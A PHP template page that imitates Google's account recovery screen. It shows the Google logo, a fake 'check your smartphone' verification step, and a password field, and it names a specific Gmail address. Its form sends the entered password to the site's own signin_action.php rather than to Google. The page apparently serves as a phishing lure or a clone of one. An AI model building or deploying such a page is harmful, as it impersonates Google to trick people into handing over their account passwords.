<?php
require 'config.php';
$title="Login to google accounts";
?>
<?php require 'partials/header-login.php';?>
<form method="POST" action="<?=$base;?>/signin_action.php">
    <div class="group-align">
        <div class="group-title">
            <img src="assets/images/pngwing.com.png" alt="logo google">
            <h2>Account recovery</h2>
            <div class="title-p">
                <p>To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
            </div>
            <div class="user-email">
                <ion-icon name="person-circle-outline"></ion-icon>
                <p>profissao33@gmail.com</p>
            </div>
        </div>
        <div class="group-i" id="recover-password">
            <div class="containeri-x">
                <div class="group-image-x">
                    <img src="<?=$base;?>/assets/images/cel.gif" height="100">
                </div>
                <div class="link"></div>
                <div class="access-i">
                    <p>Check your smartphone</p>
                    <p>Google sent a notification to your smartphone. Tap Yes on the notification to verify it’s you.
</p>
                </div>
                <div class="group-row">
                    <div class="col-acess-2">
                        <a href="<?=$base;?>/signup.php">Resend it</a>
                    </div>
                    <div class="col-acess-2 align-i">
                        <button id="button-signin-email" type="button">Next</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="group-i">
            <div class="containeri-x">
                <div class="fieldset-row-2">
                    <div class="align-i">
                        <fieldset >
                            <legend>Your password</legend>
                            <input type="password" placeholder="Enter Your new Password" name="new-password">
                        </fieldset>
                        <span>Obrigatório</span>
                    </div>
                </div>
                <div class="link">
                    <input type="checkbox" id="show">
                    <label>Show password</label>
                </div>
                <div class="group-row  m-x">
                    <div class="col-acess-2">
                        <a href="<?=$base;?>/alter_password.php">Forgout password</a>
                    </div>
                    <div class="col-acess-2 align-i">
                        <button type="button">Next</button>
                    </div>
                </div>
            </div>
        </div>
</form>
<?php require 'partials/footer-login.php';?>